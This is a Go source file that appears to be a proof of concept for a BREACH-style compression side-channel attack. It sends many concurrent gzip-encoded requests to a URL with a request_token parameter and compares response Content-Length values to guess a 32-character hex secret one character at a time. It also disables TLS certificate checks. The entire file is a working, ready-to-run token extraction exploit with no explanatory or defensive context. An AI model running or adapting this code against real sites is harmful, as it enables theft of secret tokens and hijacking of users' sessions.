package main

import "log"
import "net/http"
import "crypto/tls"
import "strconv"

type answer struct {
     test string
     l int64
}

func get_size(Url string, token string, next string, padding string, c chan answer) {
     final := Url + token + next + padding
     tr := &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
     }
     client := &http.Client{Transport: tr}
     req, err := http.NewRequest("GET", final, nil)
     if err != nil {
        log.Fatalln(err)
     }
     req.Header.Add("Accept-Encoding", "gzip, deflate")
     resp, err := client.Do(req)
     if err != nil {
        log.Fatalln(err)
     }
     l, err := strconv.ParseInt(resp.Header.Get("Content-Length"), 0, 64)
     if err != nil {
        log.Fatalln(err)
     }
     defer resp.Body.Close()
     c <- answer{next, l}
}

func prune(Url string, Token string, Options [16]string, Padding string, collisions []answer, target int64) answer{
     var possible []answer
     ch := make(chan answer, 16*len(collisions))
     for _,coll := range collisions {
          for _,opt := range Options {
               go get_size(Url, Token, coll.test + opt, Padding, ch)
          }
     }
     for i:= 0; i < 16*len(collisions) ; i++ {
          a := <-ch
          if a.l == target {
               possible = append(possible, a)
          }
     }
     var comm answer
     if len(possible) > 0 {
          comm = possible[0]
          comm.test = comm.test[0:1]
     } else {
          var new_coll []answer
          for _, el := range Options {
               new_coll = append(new_coll, answer{el, target})
          }
          comm = prune(Url, Token, Options, Padding, new_coll, target)
     }
     return comm
}

func try_many(Url string, Options [16]string, Token string,Padding string, max_size int) string{
     log.Println("[*]Trying: ", Token)
     ch := make(chan answer, 16)
     flag := false
     var collisions []answer
     for _, element := range Options {
          go get_size(Url, Token, element, Padding, ch)
     }
     min := answer{"", 888888}
     for range Options {
          a := <-ch
          if a.l < min.l {
               min = a
               flag = false
          } else if a.l == min.l {
               flag = true
               collisions = append(collisions, a)
          }
     }
     if flag {
          min = prune(Url, Token, Options, Padding, collisions, min.l)
     }
     Token = Token + min.test
     if len(Token) < max_size {
          Token = try_many(Url, Options, Token, Padding, max_size)
     }
     return Token
}


func main() {
     Url := "https://malbot.net/poc/?request_token='"
     log.Println(Url)
     Options := [16]string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"}
     Padding := "{}{}{}{}{}"
     log.Println("FINAL: ",try_many(Url, Options, "", Padding, 32))
}
